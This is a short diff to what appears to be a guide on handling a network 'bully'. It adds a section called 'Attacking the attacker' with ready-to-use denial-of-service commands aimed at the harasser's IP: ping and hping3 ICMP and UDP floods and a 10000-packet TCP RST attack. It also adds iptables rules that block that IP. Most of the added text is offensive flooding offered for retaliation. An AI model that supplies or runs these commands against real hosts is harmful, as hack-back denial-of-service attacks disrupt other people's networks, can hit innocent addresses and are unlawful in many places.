@@ -73,6 +73,17 @@ identify the port number the packet is being sent from:
 Below where it says Transmission Control Protocol, Src Port: xxxx
 fire away back at the source port with the same protocol as being sent from:
 
+Attacking the attacker
+ICMP (ping flood) Overloads bully’s ICMP traffic
+
+ping -f -s 65507 <bully-ip>
+hping3 --flood --icmp <bully-ip>
+TCP RST attack: Closes TCP connections on specific ports
+
+hping3 --rst -p <port#> -c 10000 <bully-ip>
+iptables -A OUTPUT -p tcp --dport <port#> -d <bully-ip> -j DROP
+UDP attack: Overload and Block
+
 hping3 --flood --udp -p <port#> <bully-ip>
 iptables -A INPUT -p udp --sport <port#> -s <bully-ip> -j DROP
 
